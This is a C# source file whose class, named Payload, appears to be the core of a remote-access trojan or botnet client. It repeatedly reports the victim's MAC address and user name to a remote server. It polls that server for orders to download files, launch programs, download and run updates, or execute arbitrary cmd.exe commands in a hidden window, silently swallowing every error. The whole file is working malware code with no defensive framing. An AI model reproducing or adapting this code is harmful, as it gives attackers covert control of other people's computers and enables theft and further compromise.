using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;

namespace Paper32
{
    class Payload
    {
        static public void DoTrace()
        {
            while (true)
            {
                ApiClient.DoTrace(Info.URL, Info.Mac, Info.User, Info.Version);
                Thread.Sleep(45000);
            }
        }
        static public void MainPayload()
        {
            while (true)
            {
                Thread.Sleep(3000);
                try
                {
                    ApiClient c = new ApiClient(Info.URL, Info.Mac, Info.User, Info.HTTPAuth);
                    string inst = c.GetInstruction().Replace("~~dp~~", Info.DesktopFolderPath).Replace("~~ip~~", Info.InstallFolderPath);
                    if (inst == "no-entry")
                    {
                        continue;
                    }
                    Dictionary<string, string> things = new Dictionary<string, string>();
                    string[] actualStrings = inst.Split(new string[] { ";;;;" }, StringSplitOptions.None);
                    foreach (string s in actualStrings)
                    {
                        var match = new Regex(@"^(.*?): (.*?)$").Match(s);
                        things.Add(match.Groups[1].Value, match.Groups[2].Value);
                    }
                    if (!things.ContainsKey("Instruction-Type"))
                    {
                        c.DeleteInstruction();
                        continue;
                    }
                    Console.WriteLine("Code Executed");
                    if (things["Instruction-Type"] == "download")
                    {
                        if (!things.ContainsKey("Source") || !things.ContainsKey("Destination"))
                        {
                            c.DeleteInstruction(); // Invalid instruction
                            continue;
                        }
                        try
                        {
                            c.DeleteInstruction();
                            new WebClient().DownloadFile(things["Source"], things["Destination"]);
                        }
                        catch { }
                    }
                    else if (things["Instruction-Type"] == "execute")
                    {
                        if (!things.ContainsKey("Path"))
                        {
                            c.DeleteInstruction(); // Invalid instruction
                            continue;
                        }
                        try
                        {
                            c.DeleteInstruction();
                            Process.Start(things["Path"]);
                        }
                        catch { }
                    }
                    else if (things["Instruction-Type"] == "update")
                    {
                        if (!things.ContainsKey("Source") || !things.ContainsKey("Destination"))
                        {
                            c.DeleteInstruction(); // Invalid instruction
                            continue;
                        }
                        try
                        {
                            new WebClient().DownloadFile(things["Source"], things["Destination"]);
                            Process.Start(things["Destination"]);
                            c.DeleteInstruction();
                            Tools.GoodExit();
                        }
                        catch { }
                    }
                    else if (things["Instruction-Type"] == "command")
                    {
                        if (!things.ContainsKey("Command"))
                        {
                            c.DeleteInstruction(); // Invalid instruction
                            continue;
                        }
                        try
                        {
                            c.DeleteInstruction();
                            Process p = new Process();
                            p.StartInfo.FileName = "cmd.exe"; // start "" "path"
                            p.StartInfo.Arguments = "/C " + things["Command"];
                            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden; // Make a system to choose the style mode
                            p.Start();
                            while (p.HasExited) ;
                        }
                        catch { }
                    }
                    else
                    {
                        c.DeleteInstruction(); // Invalid instruction type
                    }
                }
                catch { }
            }
        }
    }
}
